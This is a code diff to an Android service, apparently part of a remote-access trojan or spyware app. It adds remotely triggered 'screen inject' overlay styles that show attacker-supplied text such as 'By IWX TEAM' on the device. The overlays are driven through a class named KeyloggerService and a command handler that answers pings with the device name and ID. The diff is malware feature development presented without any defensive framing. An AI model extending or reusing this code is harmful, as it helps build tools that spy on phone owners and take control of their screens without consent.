@@ -283,8 +283,12 @@ class ConnectorService : Service() {
             cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
 
             // ── Screen Inject ──
-            cmd.startsWith("screen_inject:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject:")), "command_result")
-            cmd == "screen_inject_stop"      -> Pair(doScreenInjectStop(), "command_result")
+            cmd.startsWith("screen_inject_hacker:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_hacker:"),   "hacker"),   "command_result")
+            cmd.startsWith("screen_inject_matrix:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_matrix:"),   "matrix"),   "command_result")
+            cmd.startsWith("screen_inject_terminal:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject_terminal:"), "terminal"), "command_result")
+            cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   "command_result")
+            cmd.startsWith("screen_inject:")          -> Pair(doScreenInject(cmd.removePrefix("screen_inject:"),          "hacker"),   "command_result")
+            cmd == "screen_inject_stop"               -> Pair(doScreenInjectStop(), "command_result")
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
@@ -876,11 +880,11 @@ class ConnectorService : Service() {
     }
 
     // ── Screen Inject ─────────────────────────────────────────────────────────
-    private fun doScreenInject(text: String): String {
+    private fun doScreenInject(text: String, style: String = "hacker"): String {
         return try {
             val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
-            KeyloggerService.showScreenInject(trimmed)
-            "OK: Overlay ditampilkan — ${trimmed}"
+            KeyloggerService.showScreenInject(trimmed, style)
+            "OK: [${style.uppercase()}] Overlay — ${trimmed}"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
